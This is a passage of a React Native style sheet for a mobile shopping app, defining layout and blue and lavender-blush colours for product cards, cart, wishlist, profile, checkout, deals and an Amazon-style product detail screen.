    marginBottom: 12,
  },
  headerIcons: {
    flexDirection: 'row',
    gap: 15,
    alignItems: 'center',
  },
  headerIcon: {
    position: 'relative',
  },
  badge: {
    position: 'absolute',
    top: -8,
    right: -8,
    backgroundColor: '#1E90FF',
    borderRadius: 10,
    minWidth: 18,
    height: 18,
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 4,
  },
  badgeText: {
    color: '#FFF0F5',
    fontSize: 10,
    fontWeight: 'bold',
  },
  locationBtn: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 5,
    backgroundColor: 'rgba(30,144,255,0.1)',
    paddingHorizontal: 12,
    paddingVertical: 8,
    borderRadius: 20,
  },
  locationText: { 
    color: '#1E90FF', 
    fontSize: 12 
  },
  profileBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: 'rgba(30,144,255,0.1)',
    justifyContent: 'center',
    alignItems: 'center',
    overflow: 'hidden',
  },
  profileAvatar: { width: 40, height: 40 },
  searchBar: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#fff',
    borderRadius: 12,
    paddingHorizontal: 15,
    paddingVertical: 10,
    gap: 10,
    marginBottom: 12,
  },
  searchInput: { 
    flex: 1, 
    fontSize: 16,
    color: '#1E90FF',
  },
  
  // Category Section
  categorySection: {
    marginTop: 0,
    marginBottom: 5,
    backgroundColor: 'transparent',
  },
  categoryScroll: {
    marginBottom: 0,
  },
  categoryScrollContent: {
    paddingHorizontal: 0,
    gap: 10,
  },
  categoryBtn: {
    paddingVertical: 8,
    paddingHorizontal: 18,
    alignItems: 'center',
    justifyContent: 'center',
    position: 'relative',
  },
  categoryBtnActive: {},
  categoryBtnText: {
    fontSize: 14,
    color: '#1E90FF',
  },
  categoryBtnTextActive: {
    color: '#1E90FF',
    fontWeight: 'bold',
  },
  activeUnderline: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    height: 3,
    backgroundColor: '#1E90FF',
    borderTopLeftRadius: 8,
    borderTopRightRadius: 8,
  },
  
  // Hero Image
  heroImage: {
    width: width,
    height: 400,
    resizeMode: 'cover',
    marginTop: -181,
  },
  
  // Category Product Carousel
  categoryProductSection: {
    marginVertical: 15,
  },
  categoryProductHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingHorizontal: 15,
    marginBottom: 12,
  },
  categoryProductTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  categoryProductSeeAll: {
    fontSize: 13,
    color: '#1E90FF',
  },
  categoryProductScroll: {
    paddingHorizontal: 10,
    gap: 12,
  },
  categoryProductCard: {
    width: 150,
    backgroundColor: '#fff',
    borderRadius: 12,
    marginHorizontal: 5,
    padding: 12,
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    position: 'relative',
  },
  categoryProductImage: {
    width: 126,
    height: 126,
    borderRadius: 10,
    resizeMode: 'cover',
  },
  categoryProductName: {
    fontSize: 13,
    fontWeight: '500',
    color: '#1E90FF',
    marginTop: 8,
    marginBottom: 4,
    lineHeight: 16,
  },
  categoryProductPrice: {
    fontSize: 15,
    fontWeight: 'bold',
    color: '#4169E1',
  },
  categoryProductAdd: {
    position: 'absolute',
    bottom: 12,
    right: 12,
    width: 32,
    height: 32,
    borderRadius: 16,
    backgroundColor: '#1E90FF',
    justifyContent: 'center',
    alignItems: 'center',
    elevation: 2,
  },
  
  // Banner Container
  bannerContainer: {
    marginHorizontal: 15,
    marginVertical: 12,
    height: 200,
    overflow: 'hidden',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  bannerImage: {
    width: '100%',
    height: '100%',
  },
  
  // Trending Section
  trendingSection: { marginTop: 10, marginBottom: 20 },
  sectionHeader: { 
    flexDirection: 'row', 
    justifyContent: 'space-between', 
    alignItems: 'center', 
    paddingHorizontal: 15, 
    marginBottom: 15,
    marginTop: 10,
  },
  sectionTitle: { 
    fontSize: 22, 
    fontWeight: '600', 
    color: '#1E90FF',
    fontFamily: Platform.OS === 'ios' ? 'Didot' : 'Playfair Display',
    letterSpacing: 0.5,
    textAlign: 'center',
    flex: 1,
  },
  viewAll: { 
    color: '#1E90FF', 
    fontSize: 13,
    fontWeight: '500',
    fontFamily: Platform.OS === 'ios' ? 'AvenirNext-Medium' : 'Poppins',
    letterSpacing: 0.8,
    textTransform: 'uppercase',
  },
  
  // Products Grid
  productsGrid: { paddingBottom: 20 },
  columnWrapper: { justifyContent: 'space-between', paddingHorizontal: 10 },
  productCard: {
    backgroundColor: '#fff',
    borderRadius: 15,
    marginBottom: 15,
    overflow: 'hidden',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    marginHorizontal: 5,
    flex: 1,
  },
  productImageContainer: { position: 'relative' },
  productImage: { width: '100%', height: 180, resizeMode: 'cover' },
  saleTag: { 
    position: 'absolute', 
    top: 10, 
    left: 10, 
    backgroundColor: '#1E90FF', 
    paddingHorizontal: 8, 
    paddingVertical: 4, 
    borderRadius: 5 
  },
  saleTagText: { 
    color: '#FFF0F5', 
    fontSize: 10, 
    fontWeight: 'bold' 
  },
  wishlistButton: { 
    position: 'absolute', 
    top: 10, 
    right: 10, 
    backgroundColor: 'rgba(30,144,255,0.3)', 
    borderRadius: 20, 
    padding: 6 
  },
  productInfo: { padding: 12 },
  productNamePriceRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    marginBottom: 4,
  },
  productName: {
    fontSize: 14,
    fontWeight: '600',
    color: '#1E90FF',
    flex: 1,
    marginRight: 8,
    lineHeight: 18,
  },
  productPrice: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#4169E1',
  },
  originalPrice: {
    fontSize: 12,
    color: '#999',
    textDecorationLine: 'line-through',
  },
  productFooter: { 
    flexDirection: 'row', 
    justifyContent: 'space-between', 
    alignItems: 'center' 
  },
  ratingContainer: { 
    flexDirection: 'row', 
    alignItems: 'center', 
    gap: 4 
  },
  ratingText: { 
    fontSize: 12, 
    color: '#1E90FF' 
  },
  addButton: { 
    backgroundColor: '#1E90FF', 
    flexDirection: 'row', 
    alignItems: 'center', 
    paddingHorizontal: 12, 
    paddingVertical: 6, 
    borderRadius: 15, 
    gap: 4 
  },
  addButtonText: { 
    color: '#FFF0F5', 
    fontSize: 12, 
    fontWeight: '600' 
  },
  
  // Loading
  loadingContainer: { 
    flex: 1, 
    justifyContent: 'center', 
    alignItems: 'center', 
    backgroundColor: '#FFF0F5' 
  },
  loadingText: { 
    marginTop: 16, 
    fontSize: 16, 
    color: '#1E90FF' 
  },
  
  // Empty States
  emptyContainer: { 
    flex: 1, 
    justifyContent: 'center', 
    alignItems: 'center', 
    paddingHorizontal: 40,
    backgroundColor: '#FFF0F5',
  },
  emptyTitle: { 
    fontSize: 20, 
    fontWeight: 'bold', 
    color: '#1E90FF', 
    marginTop: 20, 
    marginBottom: 10 
  },
  emptyText: { 
    fontSize: 14, 
    color: '#4169E1', 
    textAlign: 'center', 
    marginBottom: 20 
  },
  emptyButton: { 
    backgroundColor: '#1E90FF', 
    paddingHorizontal: 30, 
    paddingVertical: 12, 
    borderRadius: 25 
  },
  emptyButtonText: { 
    color: '#FFF0F5', 
    fontSize: 16, 
    fontWeight: '600' 
  },
  
  // Product Detail
  detailHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    paddingHorizontal: 15,
    paddingTop: Platform.OS === 'ios' ? 50 : 15,
    paddingBottom: 15,
    backgroundColor: '#fff',
    borderBottomWidth: 1,
    borderBottomColor: '#f0f0f0',
  },
  detailBackButton: { 
    width: 40, 
    height: 40, 
    borderRadius: 20, 
    backgroundColor: '#FFF0F5', 
    justifyContent: 'center', 
    alignItems: 'center' 
  },
  detailHeaderTitle: { 
    fontSize: 18, 
    fontWeight: 'bold', 
    color: '#1E90FF', 
    flex: 1, 
    textAlign: 'center' 
  },
  detailWishlistButton: { 
    width: 40, 
    height: 40, 
    borderRadius: 20, 
    backgroundColor: '#FFF0F5', 
    justifyContent: 'center', 
    alignItems: 'center' 
  },
  detailScrollContent: { paddingBottom: 100 },
  detailImage: { width: width, height: 400, resizeMode: 'cover' },
  imageDots: { flexDirection: 'row', justifyContent: 'center', marginVertical: 15, gap: 8 },
  dot: { width: 8, height: 8, borderRadius: 4, backgroundColor: '#ccc' },
  dotActive: { backgroundColor: '#1E90FF', width: 20 },
  detailContent: { padding: 20 },
  detailName: { 
    fontSize: 24, 
    fontWeight: 'bold', 
    color: '#1E90FF', 
    marginBottom: 10 
  },
  detailPriceRow: { flexDirection: 'row', alignItems: 'baseline', marginBottom: 15 },
  detailPrice: { 
    fontSize: 32, 
    fontWeight: 'bold', 
    color: '#4169E1', 
    marginRight: 12 
  },
  detailOldPrice: { fontSize: 18, color: '#999', textDecorationLine: 'line-through' },
  detailStock: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 },
  stockBadge: { paddingHorizontal: 12, paddingVertical: 6, borderRadius: 20 },
  inStock: { backgroundColor: '#E8F5E9' },
  outStock: { backgroundColor: '#FFEBEE' },
  stockText: { fontSize: 14, fontWeight: '600', color: '#4169E1' },
  quantitySection: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 },
  quantityLabel: { fontSize: 16, fontWeight: '600', color: '#1E90FF' },
  quantitySelector: { flexDirection: 'row', alignItems: 'center', gap: 15 },
  qtyButton: { width: 40, height: 40, backgroundColor: '#FFF0F5', justifyContent: 'center', alignItems: 'center', borderRadius: 8 },
  qtyButtonText: { fontSize: 24, fontWeight: 'bold', color: '#1E90FF' },
  qtyValue: { fontSize: 18, fontWeight: 'bold', color: '#1E90FF' },
  detailActions: { flexDirection: 'row', gap: 12, marginBottom: 25 },
  addToCartButton: { 
    flex: 1, 
    backgroundColor: '#1E90FF', 
    flexDirection: 'row', 
    justifyContent: 'center', 
    alignItems: 'center', 
    paddingVertical: 15, 
    borderRadius: 12, 
    gap: 10 
  },
  buttonText: { 
    color: '#FFF0F5', 
    fontSize: 16, 
    fontWeight: 'bold' 
  },
  divider: { height: 1, backgroundColor: '#f0f0f0', marginVertical: 20 },
  sectionTitle: { fontSize: 18, fontWeight: 'bold', marginBottom: 10, color: '#1E90FF' },
  description: { fontSize: 15, color: '#4169E1', lineHeight: 24, marginBottom: 20 },
  categoriesList: { flexDirection: 'row', flexWrap: 'wrap', gap: 10, marginBottom: 20 },
  categoryTag: { backgroundColor: '#FFF0F5', paddingHorizontal: 12, paddingVertical: 6, borderRadius: 15 },
  categoryTagText: { fontSize: 13, color: '#1E90FF' },
  
  // Cart
  cartContainer: { flex: 1, backgroundColor: '#FFF0F5' },
  cartList: { padding: 15 },
  cartItem: { 
    flexDirection: 'row', 
    backgroundColor: '#fff', 
    borderRadius: 15, 
    marginBottom: 12, 
    padding: 12, 
    elevation: 2 
  },
  cartImage: { width: 90, height: 90, borderRadius: 10, resizeMode: 'cover' },
  cartDetails: { flex: 1, marginLeft: 12, justifyContent: 'space-between' },
  cartName: { 
    fontSize: 15, 
    fontWeight: '600', 
    color: '#1E90FF', 
    marginBottom: 5 
  },
  cartPrice: { 
    fontSize: 18, 
    fontWeight: 'bold', 
    color: '#4169E1', 
    marginBottom: 8 
  },
  cartActions: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
  cartQuantity: { flexDirection: 'row', alignItems: 'center', gap: 12 },
  cartQtyBtn: { 
    width: 32, 
    height: 32, 
    backgroundColor: '#FFF0F5', 
    justifyContent: 'center', 
    alignItems: 'center', 
    borderRadius: 8 
  },
  cartQtyValue: { fontSize: 16, fontWeight: 'bold', color: '#1E90FF' },
  cartFooter: { backgroundColor: '#fff', padding: 20, borderTopWidth: 1, borderTopColor: '#e0e0e0' },
  totalRow: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 12 },
  totalLabel: { fontSize: 14, color: '#1E90FF' },
  totalValue: { fontSize: 14, fontWeight: '600', color: '#4169E1' },
  grandTotal: { marginTop: 12, paddingTop: 12, borderTopWidth: 1, borderTopColor: '#e0e0e0' },
  grandTotalLabel: { fontSize: 18, fontWeight: 'bold', color: '#1E90FF' },
  grandTotalValue: { fontSize: 22, fontWeight: 'bold', color: '#4169E1' },
  checkoutButton: { 
    backgroundColor: '#1E90FF', 
    paddingVertical: 15, 
    borderRadius: 12, 
    alignItems: 'center', 
    marginTop: 15 
  },
  checkoutButtonText: { 
    color: '#FFF0F5', 
    fontSize: 18, 
    fontWeight: 'bold' 
  },
  
  // Wishlist
  wishlistList: { 
    padding: 15,
    backgroundColor: '#FFF0F5',
  },
  wishlistItem: { 
    flexDirection: 'row', 
    backgroundColor: '#fff', 
    borderRadius: 15, 
    marginBottom: 12, 
    padding: 12, 
    elevation: 2 
  },
  wishlistImage: { width: 90, height: 90, borderRadius: 10, resizeMode: 'cover' },
  wishlistDetails: { flex: 1, marginLeft: 12, justifyContent: 'space-between' },
  wishlistName: { 
    fontSize: 15, 
    fontWeight: '600', 
    color: '#1E90FF', 
    marginBottom: 5 
  },
  wishlistPrice: { 
    fontSize: 18, 
    fontWeight: 'bold', 
    color: '#4169E1', 
    marginBottom: 8 
  },
  wishlistActions: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
  wishlistAddButton: { 
    backgroundColor: '#1E90FF', 
    paddingHorizontal: 20, 
    paddingVertical: 8, 
    borderRadius: 8 
  },
  wishlistAddText: { 
    color: '#FFF0F5', 
    fontSize: 14, 
    fontWeight: '600' 
  },
  
  // Profile
  profileContainer: { flex: 1, backgroundColor: '#FFF0F5' },
  profileHeader: { 
    backgroundColor: '#1E90FF', 
    paddingVertical: 40, 
    alignItems: 'center', 
    borderBottomLeftRadius: 30, 
    borderBottomRightRadius: 30 
  },
  avatar: { width: 100, height: 100, borderRadius: 50, borderWidth: 3, borderColor: '#FFF0F5', marginBottom: 15 },
  profileName: { fontSize: 24, fontWeight: 'bold', color: '#FFF0F5', marginBottom: 5 },
  profileEmail: { fontSize: 14, color: 'rgba(255,240,245,0.8)' },
  statsContainer: { flexDirection: 'row', justifyContent: 'space-around', paddingHorizontal: 20, marginTop: -30, marginBottom: 20 },
  statCard: { backgroundColor: '#fff', paddingVertical: 15, paddingHorizontal: 25, borderRadius: 15, elevation: 4, alignItems: 'center', minWidth: 100 },
  statNumber: { fontSize: 22, fontWeight: 'bold', color: '#1E90FF' },
  statLabel: { fontSize: 12, color: '#4169E1', marginTop: 5 },
  menuItem: { flexDirection: 'row', alignItems: 'center', backgroundColor: '#fff', paddingHorizontal: 20, paddingVertical: 15, marginBottom: 1, gap: 15 },
  menuText: { flex: 1, fontSize: 16, color: '#1E90FF' },
  
  // Checkout
  checkoutHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 12,
    paddingTop: Platform.OS === 'ios' ? 50 : 12,
    paddingBottom: 12,
    backgroundColor: '#fff',
    borderBottomWidth: 1,
    borderBottomColor: '#f0f0f0',
  },
  checkoutBackButton: { 
    width: 35, 
    height: 35, 
    borderRadius: 18, 
    backgroundColor: '#FFF0F5', 
    justifyContent: 'center', 
    alignItems: 'center' 
  },
  checkoutHeaderTitle: { 
    fontSize: 16, 
    fontWeight: 'bold', 
    color: '#1E90FF', 
    flex: 1, 
    textAlign: 'center' 
  },
  checkoutScrollContent: { 
    padding: 10, 
    paddingBottom: 20,
    backgroundColor: '#FFF0F5',
  },
  orderSummaryCard: { backgroundColor: '#fff', padding: 15, borderRadius: 10, marginBottom: 8 },
  orderSummaryTitle: { 
    fontSize: 14, 
    fontWeight: 'bold', 
    marginBottom: 8,
    color: '#1E90FF',
  },
  orderItem: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 5 },
  orderItemName: { fontSize: 12, flex: 2, color: '#1E90FF' },
  orderItemQty: { fontSize: 12, marginHorizontal: 10, color: '#4169E1' },
  orderItemPrice: { fontSize: 12, fontWeight: '500', color: '#4169E1' },
  orderDivider: { height: 1, backgroundColor: '#f0f0f0', marginVertical: 8 },
  orderTotalRow: { flexDirection: 'row', justifyContent: 'space-between' },
  orderTotalLabel: { fontSize: 13, fontWeight: 'bold', color: '#1E90FF' },
  orderTotalValue: { fontSize: 14, fontWeight: 'bold', color: '#4169E1' },
  inputWrapper: { 
    flex: 1, 
    flexDirection: 'row', 
    alignItems: 'center', 
    backgroundColor: '#f5f5f5', 
    borderRadius: 8, 
    paddingHorizontal: 10, 
    marginHorizontal: 4 
  },
  rowInputs: { flexDirection: 'row', gap: 8, marginBottom: 8 },
  codBadge: { 
    backgroundColor: '#1E90FF', 
    paddingHorizontal: 5, 
    paddingVertical: 2, 
    borderRadius: 8 
  },
  codBadgeText: { 
    color: '#FFF0F5', 
    fontSize: 8, 
    fontWeight: 'bold' 
  },
  placeOrderButton: { 
    backgroundColor: '#1E90FF', 
    paddingVertical: 12, 
    borderRadius: 10, 
    alignItems: 'center', 
    marginTop: 5 
  },
  placeOrderText: { 
    color: '#FFF0F5', 
    fontSize: 15, 
    fontWeight: 'bold' 
  },
  footerSpacer: { height: 20 },
  loadingOverlay: { 
    position: 'absolute', 
    top: 0, 
    left: 0, 
    right: 0, 
    bottom: 0, 
    backgroundColor: 'rgba(30,144,255,0.9)', 
    justifyContent: 'center', 
    alignItems: 'center', 
    zIndex: 1000 
  },
  loadingOverlayText: { 
    color: '#FFF0F5', 
    fontSize: 16, 
    marginTop: 15 
  },
  
  // Keep existing styles below (heroBackground, interCategoryBanner, etc.) with updated colors
  heroBackground: {
    width: width,
    height: height * 0.5,
    resizeMode: 'cover',
  },
  interCategoryBanner: {
    marginHorizontal: 15,
    marginVertical: 15,
    height: 200,
    overflow: 'hidden',
    position: 'relative',
  },
  interBannerImage: { width: '100%', height: '100%' },
  interBannerContent: { position: 'absolute', left: 20, top: '50%', transform: [{ translateY: -25 }] },
  interBannerTitle: { fontSize: 20, fontWeight: 'bold', color: '#FFF0F5' },
  interBannerSubtitle: { fontSize: 12, color: '#FFF0F5', marginTop: 4 },

  // Featured Section
  featuredSection: {
    marginVertical: 15,
  },
  featuredScroll: {
    paddingHorizontal: 15,
    gap: 12,
  },
  featuredCard: {
    width: 140,
    backgroundColor: '#fff',
    borderRadius: 12,
    padding: 10,
    alignItems: 'center',
    elevation: 2,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  featuredImage: {
    width: 100,
    height: 100,
    borderRadius: 10,
    resizeMode: 'cover',
  },
  featuredName: {
    fontSize: 13,
    fontWeight: '600',
    color: '#1E90FF',
    marginTop: 8,
    textAlign: 'center',
  },
  featuredPrice: {
    fontSize: 14,
    fontWeight: 'bold',
    color: '#4169E1',
    marginTop: 4,
  },
  smallRatingText: {
    fontSize: 10,
    color: '#1E90FF',
  },

  // Deals Section
  dealsSection: {
    marginVertical: 15,
    backgroundColor: '#fff',
    borderRadius: 15,
    marginHorizontal: 15,
    padding: 15,
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  dealsHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 15,
  },
  dealsTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  dealsSubtitle: {
    fontSize: 12,
    color: '#4169E1',
    marginTop: 2,
  },
  timerBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#1E90FF',
    paddingHorizontal: 10,
    paddingVertical: 5,
    borderRadius: 20,
    gap: 5,
  },
  timerText: {
    color: '#FFF0F5',
    fontSize: 12,
    fontWeight: 'bold',
  },
  dealCard: {
    flexDirection: 'row',
    backgroundColor: '#FFF0F5',
    borderRadius: 12,
    overflow: 'hidden',
    marginBottom: 15,
  },
  dealImage: {
    width: 120,
    height: 120,
    resizeMode: 'cover',
  },
  dealContent: {
    flex: 1,
    padding: 12,
    justifyContent: 'center',
  },
  dealName: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 5,
  },
  dealPrice: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#4169E1',
    marginBottom: 8,
  },
  dealBadge: {
    backgroundColor: '#1E90FF',
    paddingHorizontal: 8,
    paddingVertical: 4,
    borderRadius: 12,
    alignSelf: 'flex-start',
  },
  dealBadgeText: {
    color: '#FFF0F5',
    fontSize: 10,
    fontWeight: 'bold',
  },
  dealsScroll: {
    gap: 12,
  },
  miniDealCard: {
    width: 100,
    alignItems: 'center',
    padding: 8,
    backgroundColor: '#FFF0F5',
    borderRadius: 10,
  },
  activeMiniDeal: {
    borderWidth: 2,
    borderColor: '#1E90FF',
  },
  miniDealImage: {
    width: 70,
    height: 70,
    borderRadius: 10,
    resizeMode: 'cover',
  },
  miniDealName: {
    fontSize: 11,
    fontWeight: '500',
    color: '#1E90FF',
    marginTop: 5,
    textAlign: 'center',
  },
  miniDealPrice: {
    fontSize: 11,
    fontWeight: 'bold',
    color: '#4169E1',
    marginTop: 2,
  },

  // Essentials Section
  essentialsSection: {
    marginVertical: 15,
  },
  essentialsScroll: {
    paddingHorizontal: 15,
    gap: 12,
  },
  essentialCard: {
    width: 160,
    backgroundColor: '#fff',
    padding: 12,
    position: 'relative',
  },
  essentialImage: {
    width: 136,
    height: 136,
    resizeMode: 'cover',
  },
  essentialBadge: {
    position: 'absolute',
    top: 8,
    right: 8,
    backgroundColor: '#1E90FF',
    paddingHorizontal: 8,
    paddingVertical: 3,
    borderRadius: 12,
  },
  essentialBadgeText: {
    color: '#FFF0F5',
    fontSize: 9,
    fontWeight: 'bold',
  },
  essentialName: {
    fontSize: 13,
    fontWeight: '600',
    color: '#1E90FF',
    marginTop: 8,
  },
  essentialPrice: {
    fontSize: 15,
    color: '#4169E1',
    marginTop: 20,
    textDecorationLine: 'line-through',
  },
  essentialAddBtn: {
    backgroundColor: '#1E90FF',
    paddingVertical: 6,
    borderRadius: 8,
    alignItems: 'center',
    marginTop: 8,
  },
  essentialAddText: {
    color: '#FFF0F5',
    fontSize: 11,
    fontWeight: '600',
  },

  // Category Carousel Styles
  categoryCarouselSection: {
    marginTop: 20,
    paddingHorizontal: 15,
  },
  categoryCarouselScroll: {
    paddingVertical: 10,
  },
  categoryCarouselCard: {
    width: width * 0.6,
    height: width * 0.7,
    marginRight: 12,
    borderRadius: 8,
    overflow: 'hidden',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  categoryCarouselImage: {
    width: '100%',
    height: '100%',
    resizeMode: 'cover',
  },

  // Grid Section Styles
  gridSection: {
    marginTop: 20,
    paddingHorizontal: 15,
  },
  gridContainer: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    justifyContent: 'space-between',
  },
  gridItem: {
    width: (width - 45) / 2,
    height: (width - 100),
    marginBottom: 15,
    borderRadius: 16,
    overflow: 'hidden',
  },
  gridImage: {
    width: '100%',
    height: '100%',
    resizeMode: 'contain',
  },
  gridOverlay: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    backgroundColor: 'rgba(30,144,255,0.85)',
    padding: 12,
  },
  gridTitle: {
    color: '#FFF0F5',
    fontSize: 16,
    fontWeight: 'bold',
  },
  gridDescription: {
    color: '#FFF0F5',
    fontSize: 12,
    marginTop: 4,
  },

  // Amazon Style Product Detail (keep but update colors)
  amazonImageGallery: {
    backgroundColor: '#fff',
  },
  amazonMainImageContainer: {
    position: 'relative',
    backgroundColor: '#fff',
  },
  amazonMainImage: {
    width: width,
    height: 400,
    resizeMode: 'contain',
    backgroundColor: '#f8f8f8',
  },
  amazonDiscountBadge: {
    position: 'absolute',
    top: 15,
    left: 15,
    backgroundColor: '#1E90FF',
    paddingHorizontal: 12,
    paddingVertical: 5,
    borderRadius: 4,
    zIndex: 10,
  },
  amazonDiscountText: {
    color: '#FFF0F5',
    fontSize: 12,
    fontWeight: 'bold',
  },
  amazonWishlistBtn: {
    position: 'absolute',
    top: 15,
    right: 15,
    backgroundColor: '#fff',
    width: 40,
    height: 40,
    borderRadius: 20,
    justifyContent: 'center',
    alignItems: 'center',
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    elevation: 3,
    zIndex: 10,
  },
  amazonThumbStrip: {
    marginTop: 10,
    marginBottom: 10,
  },
  amazonThumbContent: {
    paddingHorizontal: 15,
    gap: 10,
  },
  amazonThumbImage: {
    width: 60,
    height: 60,
    borderRadius: 8,
    borderWidth: 2,
    borderColor: 'transparent',
  },
  amazonThumbActive: {
    borderColor: '#1E90FF',
  },
  amazonInfoContainer: {
    padding: 16,
    backgroundColor: '#FFF0F5',
  },
  amazonBrandLink: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 8,
  },
  amazonBrandText: {
    color: '#1E90FF',
    fontSize: 14,
    marginRight: 4,
  },
  amazonTitle: {
    fontSize: 22,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 10,
    lineHeight: 30,
  },
  amazonRatingSection: {
    flexDirection: 'row',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 8,
    marginBottom: 15,
    paddingBottom: 10,
    borderBottomWidth: 1,
    borderBottomColor: '#f0f0f0',
  },
  amazonStars: {
    flexDirection: 'row',
    gap: 2,
  },
  amazonRatingCount: {
    color: '#1E90FF',
    fontSize: 13,
  },
  amazonReviewLink: {
    color: '#1E90FF',
    fontSize: 13,
  },
  amazonPriceSection: {
    backgroundColor: '#fff',
    padding: 15,
    borderRadius: 8,
    marginBottom: 15,
  },
  amazonPriceRow: {
    flexDirection: 'row',
    alignItems: 'baseline',
    flexWrap: 'wrap',
    gap: 8,
    marginBottom: 8,
  },
  amazonPriceLabel: {
    fontSize: 14,
    color: '#1E90FF',
  },
  amazonPrice: {
    fontSize: 28,
    fontWeight: 'bold',
    color: '#4169E1',
  },
  amazonOriginalPrice: {
    fontSize: 14,
    color: '#999',
    textDecorationLine: 'line-through',
  },
  amazonSaveRow: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
    marginBottom: 8,
  },
  amazonSaveLabel: {
    fontSize: 14,
    color: '#1E90FF',
  },
  amazonSaveAmount: {
    fontSize: 14,
    color: '#4169E1',
    fontWeight: '500',
  },
  amazonTaxInfo: {
    fontSize: 12,
    color: '#4169E1',
    marginBottom: 4,
  },
  amazonEMI: {
    fontSize: 12,
    color: '#4169E1',
  },
  amazonOffersSection: {
    backgroundColor: '#fff',
    borderWidth: 1,
    borderColor: '#e0e0e0',
    borderRadius: 8,
    padding: 12,
    marginBottom: 15,
  },
  amazonOffersTitle: {
    fontSize: 14,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 8,
  },
  amazonOfferItem: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
    marginBottom: 6,
  },
  amazonOfferText: {
    fontSize: 13,
    color: '#1E90FF',
  },
  amazonSizeSection: {
    marginBottom: 15,
  },
  amazonSectionHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 10,
  },
  amazonSectionTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  amazonSizeGuide: {
    color: '#1E90FF',
    fontSize: 12,
  },
  amazonSizeGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 10,
  },
  amazonSizeBtn: {
    minWidth: 50,
    paddingHorizontal: 15,
    paddingVertical: 8,
    borderWidth: 1,
    borderColor: '#ddd',
    borderRadius: 8,
    alignItems: 'center',
  },
  amazonSizeBtnActive: {
    borderColor: '#1E90FF',
    backgroundColor: '#FFF0F5',
  },
  amazonSizeText: {
    fontSize: 14,
    color: '#1E90FF',
  },
  amazonSizeTextActive: {
    color: '#1E90FF',
    fontWeight: '600',
  },
  amazonStockSection: {
    marginBottom: 15,
  },
  amazonStockRow: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
    marginBottom: 5,
  },
  amazonStockText: {
    color: '#4169E1',
    fontSize: 16,
    fontWeight: '500',
  },
  amazonOutOfStockText: {
    color: '#ff4444',
    fontSize: 16,
    fontWeight: '500',
  },
  amazonDeliveryText: {
    fontSize: 14,
    color: '#1E90FF',
    marginTop: 5,
  },
  amazonQuantitySection: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 20,
    marginBottom: 20,
    paddingVertical: 10,
    borderTopWidth: 1,
    borderBottomWidth: 1,
    borderColor: '#f0f0f0',
  },
  amazonQuantityLabel: {
    fontSize: 14,
    color: '#1E90FF',
  },
  amazonQuantityControls: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 15,
  },
  amazonQtyBtn: {
    width: 36,
    height: 36,
    borderRadius: 18,
    backgroundColor: '#FFF0F5',
    justifyContent: 'center',
    alignItems: 'center',
  },
  amazonQtyBtnDisabled: {
    opacity: 0.5,
  },
  amazonQtyBtnText: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  amazonQtyValue: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#1E90FF',
    minWidth: 30,
    textAlign: 'center',
  },
  amazonActionButtons: {
    flexDirection: 'row',
    gap: 12,
    marginBottom: 25,
  },
  amazonAddToCartBtn: {
    flex: 1,
    backgroundColor: '#1E90FF',
    flexDirection: 'row',
